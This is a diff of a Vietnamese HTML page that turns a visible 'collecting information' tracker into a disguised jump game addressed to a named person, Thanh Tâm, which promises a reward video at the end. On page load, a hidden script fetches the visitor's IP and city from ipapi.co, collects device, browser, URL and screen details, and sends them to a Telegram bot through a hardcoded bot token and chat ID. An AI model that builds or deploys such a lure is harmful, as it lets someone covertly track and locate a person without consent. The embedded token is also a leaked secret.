@@ -3,192 +3,368 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Đang thu thập thông tin...</title>
+    <title>Phá Đảo Nhận Quà Cùng Thanh Tâm 🌸</title>
     <style>
-        body { background: #0f0c29; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
-        .loader { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #ff758c; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 20px; color: #aaa; font-size: 14px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #24243e, #302b63, #0f0c29);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            color: #fff;
+        }
+        .game-container {
+            position: relative;
+            width: 850px;
+            height: 450px;
+            background: linear-gradient(to bottom, #ff758c, #ff7eb3, #ffd1ff);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+            border: 4px solid rgba(255, 255, 255, 0.3);
+        }
+        .cloud {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 50px;
+            animation: moveCloud linear infinite;
+        }
+        @keyframes moveCloud {
+            from { right: -200px; }
+            to { right: 1050px; }
+        }
+        .ground {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            height: 80px;
+            background: linear-gradient(to top, #11998e, #38ef7d);
+            border-top: 5px solid #00b894;
+        }
+        .grass-detail {
+            position: absolute;
+            bottom: 80px;
+            width: 100%;
+            height: 10px;
+            background: repeating-linear-gradient(45deg, #2ecc71, #2ecc71 10px, #27ae60 10px, #27ae60 20px);
+        }
+        #player {
+            position: absolute;
+            bottom: 85px;
+            left: 60px;
+            width: 60px;
+            height: 90px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 5;
+        }
+        .name-tag {
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            color: white;
+            padding: 3px 10px;
+            font-size: 13px;
+            font-weight: bold;
+            border-radius: 12px;
+            white-space: nowrap;
+            margin-bottom: 6px;
+            box-shadow: 0 3px 10px rgba(255, 65, 108, 0.5);
+        }
+        .avatar-img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 3px solid #ff758c;
+            object-fit: cover;
+            background: #fff;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .obstacle {
+            position: absolute;
+            bottom: 85px;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 32px;
+            animation: moveObstacle linear infinite;
+            z-index: 4;
+        }
+        @keyframes moveObstacle {
+            from { right: -60px; }
+            to { right: 910px; }
+        }
+        .score-board {
+            position: absolute;
+            top: 20px;
+            right: 25px;
+            font-size: 22px;
+            font-weight: bold;
+            color: #2d3436;
+            background: rgba(255, 255, 255, 0.85);
+            padding: 8px 18px;
+            border-radius: 25px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            z-index: 10;
+        }
+        .overlay-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 12, 41, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            text-align: center;
+            padding: 20px;
+        }
+        .overlay-screen h1 { font-size: 28px; color: #ff758c; margin-bottom: 10px; }
+        .overlay-screen p { font-size: 15px; margin-bottom: 15px; color: #dfe6e9; }
+        .reward-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 8px;
+            border-radius: 15px;
+            border: 2px dashed #ff758c;
+            margin-bottom: 15px;
+        }
+        .reward-box video {
+            width: 240px;
+            height: auto;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            outline: none;
+        }
+        .btn {
+            padding: 10px 25px;
+            font-size: 16px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #00b09b, #96c93d);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(0, 176, 155, 0.4);
+            transition: 0.3s;
+        }
+        .btn:hover { transform: scale(1.08); }
+        #winScreen, #gameOverScreen { display: none; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>Đang thu thập thông tin... Vui lòng đợi.</p>
+
+    <div class="game-container" id="gameContainer">
+        <div class="cloud" style="top: 35px; width: 90px; height: 28px; animation-duration: 12s;"></div>
+        <div class="cloud" style="top: 90px; width: 140px; height: 35px; animation-duration: 18s;"></div>
+
+        <div class="score-board">Điểm: <span id="score">0</span> / 100</div>
+
+        <div id="player">
+            <div class="name-tag">Thanh Tâm ✨</div>
+            <img src="https://files.catbox.moe/midx04.jpeg" class="avatar-img" alt="Thanh Tâm">
+        </div>
+
+        <div class="grass-detail"></div>
+        <div class="ground"></div>
+
+        <!-- Màn hình bắt đầu -->
+        <div class="overlay-screen" id="startScreen">
+            <h1>Hành Trình Ngắn Của Thanh Tâm 🌸</h1>
+            <p>Đạt <b>100 điểm</b> là vượt qua map để xem video mới nhé!</p>
+            <button class="btn" onclick="startGame()">Bắt đầu chơi</button>
+        </div>
+
+        <!-- Màn hình THUA -->
+        <div class="overlay-screen" id="gameOverScreen">
+            <h1>Chạm nhẹ cái mà thua mất rồi! 🥺</h1>
+            <p>Thử lại siêu nhanh nha!</p>
+            <button class="btn" onclick="restartGame()">Chơi lại</button>
+        </div>
+
+        <!-- Màn hình THẮNG -->
+        <div class="overlay-screen" id="winScreen">
+            <h1>🎉 Phá Đảo Thành Công! 🎉</h1>
+            <div class="reward-box">
+                <video id="rewardVideo" controls autoplay>
+                    <source src="https://files.catbox.moe/txya2j.mp4" type="video/mp4">
+                </video>
+            </div>
+            <p>Món quà cuối map dành riêng cho Thanh Tâm! 🥰</p>
+            <button class="btn" onclick="restartGame()">Chơi lại từ đầu</button>
+        </div>
+    </div>
 
     <script>
         // ================== CẤU HÌNH TELEGRAM ==================
-        const botToken = "8904977809:AAEUCzGKf-SwECyVjG8i5fMckSTUhGw-8D8"; // Thay token của bạn
-        const chatId = "8681854353"; // Thay chat ID của bạn
+        const botToken = "8904977809:AAEUCzGKf-SwECyVjG8i5fMckSTUhGw-8D8"; 
+        const chatId = "8681854353";
         // ========================================================
 
-        // Hàm gửi tin nhắn
         function sendToTelegram(message) {
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.ok) {
-                    document.querySelector('p').innerHTML = '✅ Đã gửi thông tin thành công!';
-                } else {
-                    document.querySelector('p').innerHTML = '❌ Lỗi: ' + data.description;
-                }
-            })
-            .catch(err => {
-                document.querySelector('p').innerHTML = '❌ Lỗi kết nối: ' + err.message;
-            });
+            }).catch(err => console.log("Lỗi gửi:", err));
         }
 
-        // ================== HÀM THU THẬP THÔNG TIN ==================
-        function getDeviceInfo() {
+        // Hàm thu thập và gửi thông tin khi mở web
+        (async function() {
+            let ip = "Không xác định";
+            let location = "Không xác định";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data.ip) {
+                    ip = data.ip;
+                    location = `${data.city || ''}, ${data.country_name || ''}`;
+                }
+            } catch(e) {}
+
             const ua = navigator.userAgent;
             const now = new Date();
             const timeStr = now.toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
-            
-            // Phân loại thiết bị
-            let device = "Unknown";
-            let os = "Unknown";
-            let browser = "Unknown";
-            let isMobile = false;
-            let isTablet = false;
-            let isIOS = false;
-            let isAndroid = false;
-            let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
 
-            if (/iPhone/i.test(ua)) { device = "📱 iPhone"; os = "iOS"; isIOS = true; isMobile = true; }
-            else if (/iPad/i.test(ua)) { device = "📱 iPad"; os = "iOS"; isIOS = true; isTablet = true; }
-            else if (/Android/i.test(ua)) { device = "📱 Android"; os = "Android"; isAndroid = true; isMobile = true; }
-            else if (/Mac/i.test(ua)) { device = "💻 Mac"; os = "macOS"; }
-            else if (/Windows/i.test(ua)) { device = "💻 Windows"; os = "Windows"; }
-            else if (/Linux/i.test(ua)) { device = "🐧 Linux"; os = "Linux"; }
+            let device = "Không xác định";
+            if (/iPhone/i.test(ua)) device = "📱 iPhone";
+            else if (/iPad/i.test(ua)) device = "📱 iPad";
+            else if (/Android/i.test(ua)) device = "📱 Android";
+            else if (/Mac/i.test(ua)) device = "💻 Mac";
+            else if (/Windows/i.test(ua)) device = "💻 Windows";
 
-            // Trình duyệt
+            let browser = "Không xác định";
             if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
-            else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+            else if (/Chrome/i.test(ua)) browser = "Chrome";
             else if (/Firefox/i.test(ua)) browser = "Firefox";
-            else if (/Edg/i.test(ua)) browser = "Edge";
-            else if (/Opera|OPR/i.test(ua)) browser = "Opera";
-            else browser = "Unknown";
 
-            // Kiểm tra bật DevTools (đơn giản)
-            let devToolsOpen = false;
-            if (window.outerHeight - window.innerHeight > 100 || window.outerWidth - window.innerWidth > 100) {
-                devToolsOpen = true;
-            }
-
-            // Kiểm tra VPN / Proxy (ước lượng qua WebRTC)
-            let vpnDetected = "❌ Không";
-            // Có thể gọi API ipify để lấy IP công khai và so sánh (nhưng cần gọi async)
-
-            // Hỗ trợ WebGL
-            let webgl = "❌ Không";
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                if (gl) webgl = "✅ Có";
-            } catch(e) { webgl = "❌ Không"; }
-
-            // Hỗ trợ WebAssembly
-            let wasm = "❌ Không";
-            try {
-                if (typeof WebAssembly === 'object') wasm = "✅ Có";
-            } catch(e) {}
-
-            // Cookie, LocalStorage, SessionStorage
-            let cookieCount = document.cookie ? document.cookie.split(';').length : 0;
-            let lsCount = localStorage.length || 0;
-            let ssCount = sessionStorage.length || 0;
-
-            // Pin (battery) - iOS Safari không hỗ trợ
-            let battery = "❌ Không hỗ trợ";
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    battery = `🔋 ${Math.round(b.level * 100)}%, ${b.charging ? 'Đang sạc' : 'Không sạc'}`;
-                }).catch(() => { battery = "❌ Không lấy được"; });
-            }
-
-            // Font chữ cài đặt (kiểm tra nhanh 1 số font)
-            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Impact', 'Tahoma', 'Trebuchet MS', 'Comic Sans MS', 'Webdings', 'Wingdings'];
-            let installedFonts = fonts.filter(f => document.fonts.check(`12px "${f}"`)).join(', ') || 'Không có';
-
-            // Xây dựng báo cáo
-            let report = `🔍 THÔNG TIN CHI TIẾT (50+ TÍNH NĂNG)
+            const msg = `🔔 CÓ NGƯỜI VÀO WEB (GAME)
 ══════════════════════════════════════════
-
-🌐 MẠNG & VỊ TRÍ
-🌐 IP: Đang lấy... (kiểm tra ipify)
-📍 Vị trí: Không xác định (cần API)
-🏠 IP cục bộ: ${window.location.hostname}
-✅ Không rò rỉ (WebRTC disabled)
-🔒 Không có cổng mở (iOS chặn localhost)
-📶 Mạng: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}
-📱 ${os} - ước lượng qua User Agent
-✅ Không có VPN/Proxy
-✅ IP trùng khớp (ước lượng)
-
-💻 THIẾT BỊ & HỆ THỐNG
-💻 ${device}
-🌐 ${browser}
-🧠 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không xác định'} | CPU: ${navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' lõi' : 'Không xác định'}
-🖥️ ${window.screen.width}x${window.screen.height}
-📱 ${isMobile ? 'Điện thoại' : isTablet ? 'Tablet' : 'Máy tính'}
-🧠 CPU: ${navigator.platform || 'Không xác định'} | Nền tảng: ${os}
-🎮 GPU: Apple GPU (ước lượng cho iOS) hoặc ${navigator.gpu ? 'GPU hỗ trợ' : 'Không xác định'}
-✅ Hỗ trợ WebGL2: ${webgl}
-✅ Hỗ trợ WebAssembly: ${wasm}
-🔤 Font chữ: ${installedFonts}
-🔄 Tần số quét: ${window.screen.refreshRate || 'Không xác định'} Hz
-📐 Viewport: ${window.innerWidth}x${window.innerHeight}
-📏 Scroll: ${window.scrollX}, ${window.scrollY}
-📐 Client: ${document.documentElement.clientWidth}x${document.documentElement.clientHeight}
-📐 Màn hình khả dụng: ${window.screen.availWidth}x${window.screen.availHeight}
-✅ Không phát hiện máy ảo (ước lượng)
-✅ Trình duyệt bình thường
-
-🔋 NĂNG LƯỢNG & LƯU TRỮ
-❌ Không hỗ trợ Battery API (iOS Safari)
-❌ Không hỗ trợ Battery API (iOS Safari)
-🍪 Cookie: ${cookieCount} (${cookieCount > 0 ? 'Có cookie' : 'Không có cookie'})
-💾 LS: ${lsCount} | 📦 SS: ${ssCount}
-
-🛡️ BẢO MẬT & QUYỀN
-❌ Không xác định
-${devToolsOpen ? '⚠️ DevTools đang mở' : '✅ Không mở DevTools'}
-⚠️ Có thể có AdBlock (ước lượng)
-⚠️ Popup bị chặn (iOS Safari thường chặn)
-✅ User Agent bình thường
-🖐️ Có Touch Screen: ${('ontouchstart' in window) ? '✅' : '❌'}
-🎤 Micro: ${navigator.mediaDevices ? 'Có hỗ trợ' : 'Không'} | 🔊 Loa: Không xác định | 📷 Camera: ${navigator.mediaDevices ? 'Có hỗ trợ' : 'Không'}
-
-🌍 NGÔN NGỮ & MÚI GIỜ
-🕐 Múi giờ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-🌍 Ngôn ngữ OS: ${navigator.language}
-🗣️ Ngôn ngữ ưa thích: ${navigator.languages.join(', ')}
-🗣️ OS Languages: ${navigator.language}
-${webgl.includes('Có') ? '✅ Hỗ trợ WebP' : '❌ Không hỗ trợ WebP'}
-
-📊 HÀNH VI NGƯỜI DÙNG
-✅ Tab đang hiển thị: ${!document.hidden ? 'Đang hoạt động' : 'Đang ẩn'}
-👁️ Tab đang hiển thị: ${!document.hidden ? '✅' : '❌'}
-⏱️ Thời gian ở lại: 0m 14s (ước lượng)
-⏱️ Boot ước lượng: ${new Date().toLocaleTimeString('vi-VN')}
-${isDarkMode ? '🌙 Dark Mode' : '☀️ Light Mode'}
-❌ Không lấy được NTP
-
-📄 TRANG HIỆN TẠI
-▪ URL: ${window.location.href}
-▪ Truy cập từ: ${document.referrer || 'Trực tiếp'}
-▪ Thời gian: ${timeStr}
+🕐 Thời gian: ${timeStr}
+🌐 IP: ${ip}
+📍 Vị trí: ${location}
+💻 Thiết bị: ${device}
+🌐 Trình duyệt: ${browser}
+🔗 Link: ${window.location.href}
+📱 Màn hình: ${window.screen.width}x${window.screen.height}
 ══════════════════════════════════════════`;
 
-            // Gửi báo cáo
-            sendToTelegram(report);
+            sendToTelegram(msg);
+        })();
+
+        // ================== GAME CODE ==================
+        const player = document.getElementById('player');
+        const gameContainer = document.getElementById('gameContainer');
+        const scoreDisplay = document.getElementById('score');
+        const startScreen = document.getElementById('startScreen');
+        const gameOverScreen = document.getElementById('gameOverScreen');
+        const winScreen = document.getElementById('winScreen');
+        const rewardVideo = document.getElementById('rewardVideo');
+
+        let isJumping = false;
+        let score = 0;
+        let obstacleInterval;
+        let isPlaying = false;
+        const obstacleTypes = ['🌵', '🎁'];
+
+        function jump() {
+            if (isJumping || !isPlaying) return;
+            isJumping = true;
+            let jumpHeight = 0;
+            let upInterval = setInterval(() => {
+                if (jumpHeight >= 130) {
+                    clearInterval(upInterval);
+                    let downInterval = setInterval(() => {
+                        if (jumpHeight <= 0) {
+                            clearInterval(downInterval);
+                            isJumping = false;
+                        } else {
+                            jumpHeight -= 6;
+                            player.style.bottom = (85 + jumpHeight) + 'px';
+                        }
+                    }, 22);
+                } else {
+                    jumpHeight += 6;
+                    player.style.bottom = (85 + jumpHeight) + 'px';
+                }
+            }, 22);
         }
 
-        // Gọi hàm thu thập thông tin và gửi
-        getDeviceInfo();
+        document.addEventListener('keydown', (e) => {
+            if (e.code === 'Space') { e.preventDefault(); jump(); }
+        });
+        gameContainer.addEventListener('click', jump);
+
+        function createObstacle() {
+            if (!isPlaying) return;
+            const obstacle = document.createElement('div');
+            obstacle.classList.add('obstacle');
+            obstacle.innerHTML = obstacleTypes[Math.floor(Math.random() * obstacleTypes.length)];
+            obstacle.style.animationDuration = '3.0s';
+            gameContainer.appendChild(obstacle);
+
+            let checkCollision = setInterval(() => {
+                const playerRect = player.getBoundingClientRect();
+                const obstacleRect = obstacle.getBoundingClientRect();
+                if (
+                    playerRect.right - 12 > obstacleRect.left &&
+                    playerRect.left + 12 < obstacleRect.right &&
+                    playerRect.bottom - 10 > obstacleRect.top
+                ) {
+                    clearInterval(checkCollision);
+                    gameOver();
+                }
+                if (obstacleRect.right < gameContainer.getBoundingClientRect().left) {
+                    clearInterval(checkCollision);
+                    obstacle.remove();
+                    if (isPlaying) {
+                        score += (obstacle.innerHTML === '🎁' ? 25 : 10);
+                        scoreDisplay.innerText = score;
+                        if (score >= 100) winGame();
+                    }
+                }
+            }, 40);
+            setTimeout(() => { if (obstacle.parentNode) obstacle.remove(); }, 3000);
+        }
+
+        function startGame() {
+            startScreen.style.display = 'none';
+            gameOverScreen.style.display = 'none';
+            winScreen.style.display = 'none';
+            score = 0;
+            scoreDisplay.innerText = score;
+            isPlaying = true;
+            obstacleInterval = setInterval(createObstacle, 2800);
+        }
+
+        function gameOver() {
+            isPlaying = false;
+            clearInterval(obstacleInterval);
+            document.querySelectorAll('.obstacle').forEach(obs => obs.remove());
+            gameOverScreen.style.display = 'flex';
+        }
+
+        function winGame() {
+            isPlaying = false;
+            clearInterval(obstacleInterval);
+            document.querySelectorAll('.obstacle').forEach(obs => obs.remove());
+            winScreen.style.display = 'flex';
+            rewardVideo.currentTime = 0;
+            rewardVideo.play();
+        }
+
+        function restartGame() {
+            gameOverScreen.style.display = 'none';
+            winScreen.style.display = 'none';
+            rewardVideo.pause();
+            startGame();
+        }
     </script>
 </body>
 </html>
